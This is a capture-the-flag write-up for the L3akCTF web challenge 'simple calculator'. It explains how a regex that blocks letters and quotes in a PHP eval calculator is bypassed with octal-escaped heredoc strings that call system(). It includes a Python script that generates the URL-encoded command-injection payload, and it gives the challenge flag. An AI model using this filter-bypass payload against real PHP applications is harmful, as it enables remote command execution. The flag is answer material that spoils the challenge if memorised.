---
title: simple calculator
date: 2024-05-27T14:51:02+03:00
description: Writeup for simple calculator [L3akCTF]
author: Hust
tags:
- web
- command injection
draft: false
---

## Challenge Description

Unveil PHP Secrets.

## Intuition

The challenge involves a PHP script that evaluates mathematical expressions from a URL parameter. The script has input validation using a regex to prevent the use of alphabetic characters and quotes. By leveraging PHP's handling of heredoc syntax and octal encoding, we can craft an input that bypasses these restrictions and executes the desired command to retrieve the flag.

## Solution

1. **Octal characters**

    If a string is enclosed in double quotes (or heredocs), PHP will interpret octal characters as regular characters.

    e.g. `"\101" === "A"`

2. **Heredocs**

    Since we cannot have quotes, a way to delimit strings is the heredoc syntax: `<<<`. After this operator, an identifier is provided, then a newline. The string itself follows, and then the same identifier again to close the quotation.

    By reading the documentation for PHP Heredoc:

    [PHP Heredoc Documentation](https://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc)

    "Also, the closing identifier must follow the same naming rules as any other label in PHP: it must contain only alphanumeric characters and underscores, and must start with a non-digit character or underscore."

    We learn that the identifier must start with a letter or underscore, and since we cannot have letters due to the regex validation, the only option is the underscore. So in this stage the payload will look like this:

    ```php
    <<<_
    payload_in_octal
    _
    ```

3. **Executing functions**

    Since our input must be inside quotes (or heredocs) to be converted from octals, we cannot execute functions in the regular way `func(args)`. Another way to execute functions in PHP is `("func")("args")` so we just need to wrap our payload in parentheses like this:

    ```php
    (<<<_ func-name-in-octal _)(<<<_ args-in-octal _)
    ```

    So we can do something like:

    ```php
    (<<<_ system_in_octal _)(<<<_ ls_in_octal _)
    ```

    Also, we can encode the payload to send it directly.

    Here is a Python script to automate all these steps:

    ```python
    import urllib.parse

    p1 = "system"
    p2 = 'cat flag*.txt'

    final_array = []

    final_array.append("(<<<_\n")

    for letter in p1:
        final_array.append(f"\\{oct(ord(letter))[2:]}")

    final_array.append("\n_)")

    final_array.append("(<<<_\n")

    for letter in p2:
        final_array.append(f"\\{oct(ord(letter))[2:]}")

    final_array.append("\n_)")

    cmd = "".join(final_array)

    # URL encoding the command
    encoded_cmd = urllib.parse.quote(cmd)

    print(encoded_cmd)
    ```

### Flag

`L3AK{PhP_Web_Ch@ll3ng3}`

## References

[PHP Heredoc Documentation](https://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc)
